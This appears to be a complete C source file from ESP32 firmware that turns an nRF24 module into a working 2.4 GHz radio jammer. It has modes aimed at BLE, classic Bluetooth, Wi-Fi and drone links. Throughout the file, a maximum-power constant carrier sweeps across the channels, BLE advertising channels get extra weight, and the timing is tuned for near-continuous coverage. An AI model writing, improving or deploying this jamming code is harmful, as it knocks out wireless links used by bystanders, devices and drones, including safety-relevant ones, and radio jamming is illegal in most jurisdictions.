#include "nrf24_jammer.h"
#include "nrf24.h"

#include <string.h>

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_log.h"
#include "esp_random.h"
#include "esp_timer.h"

#define TAG "nrf24_jammer"

/* Pin map: the nRF24 shares the SD card's SPI2 bus (SCK/MOSI/MISO) and uses its
 * own CS + CE. Change these if you wire the module differently. */
#define NRF24_SPI_HOST   SPI2_HOST
#define NRF24_SCK_PIN    6   /* shared with SD_CLK */
#define NRF24_MOSI_PIN   7   /* shared with SD_MOSI */
#define NRF24_MISO_PIN   2   /* shared with SD_MISO */
#define NRF24_CS_PIN     3   /* dedicated chip-select (was CC1101 CS) */
#define NRF24_CE_PIN     4   /* dedicated chip-enable (was CC1101 GDO0) */

/* PA max with the LNA bit set (RF_SETUP low nibble = 0b0111), matching the
 * Arduino RF24 setPALevel(RF24_PA_MAX, true). */
#define NRF24_TX_POWER   7

/* The jam task runs below the console, so `stop` is handled by preemption and
 * we no longer need frequent yields. The only remaining reason to block is to
 * feed the idle-task watchdog (5 s timeout): sweep continuously for this long,
 * then take a single 10 ms (1 tick) breather. ~2 s keeps the carrier sweeping
 * ~99.5% of the time. */
#define JAM_WDT_FEED_US  2000000

static nrf24_device_t s_dev;
static bool s_initialized = false;

static volatile bool s_jam_stop = true;
static volatile bool s_jam_running = false;
static nrf24_jam_band_t s_band = JAM_ALL;
static TaskHandle_t s_jam_task = NULL;

const char* nrf24_jammer_band_name(nrf24_jam_band_t band) {
    switch (band) {
        case JAM_BLE: return "ble";
        case JAM_BT: return "bt";
        case JAM_WIFI: return "wifi";
        case JAM_DRONE: return "drone";
        case JAM_ALL: return "all";
        default: return "all";
    }
}

bool nrf24_jammer_init(void) {
    if (!s_initialized) {
        memset(&s_dev, 0, sizeof(s_dev));
        s_dev.host = NRF24_SPI_HOST;
        s_dev.sck_pin = NRF24_SCK_PIN;
        s_dev.mosi_pin = NRF24_MOSI_PIN;
        s_dev.miso_pin = NRF24_MISO_PIN;
        s_dev.cs_pin = NRF24_CS_PIN;
        s_dev.ce_pin = NRF24_CE_PIN;
        s_dev.initialized = false;

        if (!nrf24_init(&s_dev)) {
            ESP_LOGE(TAG, "SPI device init failed");
            return false;
        }
        s_initialized = true;
    }

    bool connected = nrf24_check_connected(&s_dev);
    if (connected) {
        ESP_LOGI(TAG, "nRF24 detected on SPI%d (CS=%d, CE=%d)",
                 (int)NRF24_SPI_HOST, NRF24_CS_PIN, NRF24_CE_PIN);
    } else {
        ESP_LOGW(TAG, "nRF24 not responding (check wiring/power)");
    }
    return connected;
}

/* ---- jam loop (single module, constant carrier) ------------------------- */

/* BLE advertising channels: nRF 2/26/80 = 2402/2426/2480 MHz. */
static const uint8_t ble_adv[3] = {2, 26, 80};

/* Fast constant-carrier sweep over channels [lo, hi]. Hops with no per-hop
 * delay and only blocks (10 ms) after JAM_WDT_FEED_US of continuous sweeping to
 * feed the idle watchdog, so the carrier covers the band almost continuously. */
static void jam_sweep(uint8_t lo, uint8_t hi) {
    nrf24_startConstCarrier(&s_dev, NRF24_TX_POWER, lo);

    int64_t last_feed_us = esp_timer_get_time();
    while (!s_jam_stop) {
        for (uint8_t ch = lo; ch <= hi && !s_jam_stop; ch++) {
            nrf24_write_reg(&s_dev, REG_RF_CH, ch);
            if (esp_timer_get_time() - last_feed_us >= JAM_WDT_FEED_US) {
                vTaskDelay(1);
                last_feed_us = esp_timer_get_time();
            }
        }
    }

    nrf24_stopConstCarrier(&s_dev);
}

/* BLE-focused sweep: weave an advertising channel between every band channel so
 * the three advertising frequencies are hit far more often (every ~3 steps)
 * while still covering the whole BLE band (2..80). */
static void jam_ble(void) {
    nrf24_startConstCarrier(&s_dev, NRF24_TX_POWER, ble_adv[0]);

    int64_t last_feed_us = esp_timer_get_time();
    uint8_t a = 0;
    while (!s_jam_stop) {
        for (uint8_t ch = 2; ch <= 80 && !s_jam_stop; ch++) {
            nrf24_write_reg(&s_dev, REG_RF_CH, ble_adv[a]);
            a = (a + 1) % 3;
            nrf24_write_reg(&s_dev, REG_RF_CH, ch);
            if (esp_timer_get_time() - last_feed_us >= JAM_WDT_FEED_US) {
                vTaskDelay(1);
                last_feed_us = esp_timer_get_time();
            }
        }
    }

    nrf24_stopConstCarrier(&s_dev);
}

static void nrf24_jam_task(void* ctx) {
    (void)ctx;
    s_jam_running = true;

    switch (s_band) {
        case JAM_BLE: jam_ble(); break;           /* BLE, adv channels weighted */
        case JAM_BT: jam_sweep(0, 83); break;     /* classic BT band */
        case JAM_WIFI: jam_sweep(1, 84); break;   /* WiFi 2.4 GHz span */
        case JAM_DRONE:
        case JAM_ALL:
        default:
            jam_sweep(0, 125);                    /* full 2.4 GHz */
            break;
    }

    /* Leave the radio idle. */
    nrf24_set_idle(&s_dev);

    s_jam_running = false;
    s_jam_task = NULL;
    vTaskDelete(NULL);
}

bool nrf24_jammer_start(nrf24_jam_band_t band) {
    if (!s_initialized) {
        ESP_LOGW(TAG, "start refused: run init_nrf24 first");
        return false;
    }
    if (s_jam_running || s_jam_task != NULL) {
        ESP_LOGW(TAG, "start refused: jammer already running");
        return false;
    }

    s_band = band;
    s_jam_stop = false;

    /* Priority 1: just above idle, below the priority-2 console task (and all
     * WiFi/system tasks). The console therefore preempts the jammer the instant
     * a `stop` line arrives, so the sweep can run nearly continuously without
     * frequent voluntary yields. */
    BaseType_t ok = xTaskCreate(nrf24_jam_task, "nrf24_jam", 4096, NULL, 1, &s_jam_task);
    if (ok != pdPASS) {
        s_jam_task = NULL;
        s_jam_stop = true;
        ESP_LOGE(TAG, "failed to create jam task");
        return false;
    }
    ESP_LOGI(TAG, "jammer started (band=%s)", nrf24_jammer_band_name(band));
    return true;
}

void nrf24_jammer_stop(void) {
    if (!s_jam_running && s_jam_task == NULL) return;

    s_jam_stop = true;

    /* Wait for the task to exit cleanly. */
    for (int i = 0; i < 40 && s_jam_task != NULL; i++) {
        vTaskDelay(pdMS_TO_TICKS(25));
    }
    if (s_jam_task != NULL) {
        vTaskDelete(s_jam_task);
        s_jam_task = NULL;
        s_jam_running = false;
        ESP_LOGW(TAG, "jam task force-deleted");
    }

    if (s_initialized) {
        nrf24_stopConstCarrier(&s_dev);
        nrf24_set_idle(&s_dev);
    }
    ESP_LOGI(TAG, "jammer stopped");
}

bool nrf24_jammer_is_running(void) {
    return s_jam_running;
}
